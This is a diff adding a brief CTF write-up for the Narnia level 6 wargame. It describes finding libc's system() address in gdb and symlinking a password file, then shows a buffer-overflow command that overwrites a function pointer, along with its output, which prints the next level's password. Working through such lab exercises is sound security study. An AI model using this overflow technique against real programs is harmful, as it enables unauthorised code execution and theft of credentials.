@@ -1,0 +1,6 @@
+We just need to look up in gdb the address of the "system" libc function and put that into fp. Also have a soft link to /etc/narnia_pass/narnia7
+Alos make our temp dir readable and executable by anyone.
+
+$ /narnia/narnia6 $'AAAAAAAA\x40\x19\xe5\xf7' "BBBBBBBBcat pa"
+ahkiaziphu
+narnia6@narnia:/tmp/tmp.kPhWwnptQ5$
